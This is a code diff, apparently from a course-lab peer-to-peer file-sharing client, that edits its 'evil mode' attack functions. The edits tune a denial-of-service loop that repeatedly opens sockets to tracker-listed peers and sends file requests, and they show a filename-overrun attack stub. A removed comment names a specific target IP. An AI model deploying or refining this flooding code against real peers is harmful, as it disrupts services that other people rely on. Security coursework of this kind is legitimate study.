@@ -557,7 +557,7 @@ exit:
     return t;
 }
 
-void static do_filename_overrun_attack(task_t *overrun_task)
+static void do_filename_overrun_attack(task_t *overrun_task)
 {
     if (!overrun_task || !overrun_task->peer_list) {
         error("No peer can be attacked!\n");
@@ -599,7 +599,7 @@ try_again:
     
 }
 
-void static denial_of_service(task_t *t)
+static void denial_of_service(task_t *t)
 {
     if (!t || !t->peer_list) {
         error("No peer can be attacked!\n");
@@ -611,21 +611,20 @@ void static denial_of_service(task_t *t)
     
     peer_t *current_peer_list = t->peer_list;
     int i = 0;
-    for(;i<10000; i++) {
+    for(;i<2000;i++) {
         message("* Attacking peer %s:%d\n",
                 inet_ntoa(current_peer_list->addr), current_peer_list->port);
-        //cutomized attack
-        /*if (strcmp(inet_ntoa(current_peer_list->addr), "128.97.228.95")==0) {
-            current_peer_list = current_peer_list->next==0 ? t->peer_list : current_peer_list->next;
-        }*/
         t->peer_fd = open_socket(current_peer_list->addr, current_peer_list->port);
         if (t->peer_fd == -1) {
             error("* Cannot connect to peer: %s for attack\n", strerror(errno));
             goto try_again;
         }
+        osp2p_writef(t->peer_fd, "GET cat1.jpg OSP2P\n");
+    next:
         current_peer_list = current_peer_list->next==0 ? t->peer_list : current_peer_list->next;
+        //current_peer_list = current_peer_list->next;
     }
-    message("Finish socket attack\n");
+    message("finish deploying attack\n");
     return;
         
     try_again:
@@ -978,12 +977,22 @@ int main(int argc, char *argv[])
     }else if(evil_mode==2)
     {
         //denial of service attack
-        if (fork()==0) {
-            while(1){
-                task_t *denial_of_service_task;
-                denial_of_service_task = prepare_attack(tracker_task);
-                denial_of_service(denial_of_service_task);
+        int status;
+        while (1){
+            tracker_task = start_tracker(tracker_addr, tracker_port);
+            if (fork()==0) {
+                int i = 0;
+                for(;i<10;i++){
+                    task_t *denial_of_service_task;
+                    denial_of_service_task = prepare_attack(tracker_task);
+                    if (denial_of_service_task->peer_list==0) {
+                        _exit(0);
+                    }
+                    denial_of_service(denial_of_service_task);
+                }
+                _exit(0);
             }
+            waitpid(-1,&status,0);
         }
     }
     else if (evil_mode==3) {
